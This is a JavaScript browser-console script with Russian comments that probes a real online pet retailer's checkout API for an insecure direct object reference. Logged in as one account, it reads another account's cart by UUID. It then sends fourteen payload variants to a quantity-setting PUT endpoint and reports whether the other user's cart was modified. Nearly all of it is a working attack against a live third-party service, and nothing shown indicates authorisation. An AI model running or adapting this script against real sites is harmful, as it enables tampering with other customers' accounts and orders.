// Комплексный тест всех вариантов PUT запроса
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

console.log("[*] ========================================");
console.log("[*] COMPREHENSIVE PUT METHOD TEST");
console.log("[*] ========================================");

fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  window.beforeCount = cart.articles.length;
  window.beforeTotal = cart.summary.grandTotal;
  const articleId = cart.articles[0]?.id;
  const offerId = cart.articles[0]?.offerId;
  const sellerOfferId = cart.articles[0]?.sellerOfferId;
  
  console.log(`[+] Cart before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
  console.log(`[+] Article ID: ${articleId}, Offer ID: ${offerId}, Seller Offer ID: ${sellerOfferId}`);
  
  // Все возможные варианты payload
  const tests = [
    { name: "1. articleId + quantity", payload: { articleId: articleId, quantity: 2 } },
    { name: "2. id + quantity", payload: { id: articleId, quantity: 2 } },
    { name: "3. articleId + qty", payload: { articleId: articleId, qty: 2 } },
    { name: "4. articleId as string", payload: { articleId: String(articleId), quantity: 2 } },
    { name: "5. quantity as string", payload: { articleId: articleId, quantity: "2" } },
    { name: "6. With cartUuid", payload: { articleId: articleId, quantity: 2, cartUuid: CART_UUID } },
    { name: "7. With sid", payload: { articleId: articleId, quantity: 2, sid: CART_UUID } },
    { name: "8. With cartId", payload: { articleId: articleId, quantity: 2, cartId: cart.cartId } },
    { name: "9. offerId instead of articleId", payload: { offerId: offerId, quantity: 2 } },
    { name: "10. sellerOfferId", payload: { sellerOfferId: sellerOfferId, quantity: 2 } },
    { name: "11. Full article object", payload: { article: { id: articleId }, quantity: 2 } },
    { name: "12. Array format", payload: { articles: [{ id: articleId, quantity: 2 }] } },
    { name: "13. With siteId", payload: { articleId: articleId, quantity: 2, siteId: 1 } },
    { name: "14. Remove (quantity 0)", payload: { articleId: articleId, quantity: 0 } },
  ];
  
  return Promise.allSettled(
    tests.map((test, i) => {
      console.log(`\n[*] ${test.name}`);
      return fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
        method: "PUT",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        body: JSON.stringify(test.payload)
      })
      .then(async r => {
        const status = r.status;
        const contentType = r.headers.get("content-type") || "";
        const text = await r.text();
        
        if (status === 200 && contentType.includes("application/json")) {
          try {
            const json = JSON.parse(text);
            console.log(`    [!!!] SUCCESS! HTTP ${status}, JSON response`);
            console.log(`    Response: ${JSON.stringify(json).substring(0, 150)}`);
            return { success: true, test: i+1, name: test.name, payload: test.payload, status, response: json };
          } catch (e) {
            console.log(`    Status: ${status}, but not JSON: ${text.substring(0, 100)}`);
            return { success: false, test: i+1, name: test.name, status, response: text };
          }
        } else {
          console.log(`    Status: ${status}, Content-Type: ${contentType}`);
          if (text.length < 200) {
            console.log(`    Response: ${text}`);
          }
          return { success: false, test: i+1, name: test.name, status, response: text };
        }
      })
      .catch(e => {
        console.log(`    Error: ${e.message}`);
        return { success: false, test: i+1, name: test.name, error: e.message };
      });
    })
  );
})
.then(results => {
  console.log("\n[*] ========================================");
  console.log("[*] All tests completed. Checking cart...");
  console.log("[*] ========================================");
  
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  });
})
.then(r => r.json())
.then(cart => {
  const afterCount = cart.articles.length;
  const afterTotal = cart.summary.grandTotal;
  console.log(`\n[+] Cart after: ${afterCount} items, ${afterTotal} EUR`);
  
  if (afterCount !== window.beforeCount || Math.abs(afterTotal - window.beforeTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
    console.log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
    console.log("[!!!] Account B successfully modified Account A's cart!");
    console.log("\n[!!!] Working endpoint:");
    console.log(`[!!!] PUT /semiprotected/api/checkout/state-api/v2/set-article-quantity`);
  } else {
    console.log("\n[!] Cart unchanged - none of the payload formats worked");
    console.log("[!] Need to check exact payload from Network tab when clicking quantity button");
  }
})
.catch(e => console.error("[!] Error:", e));

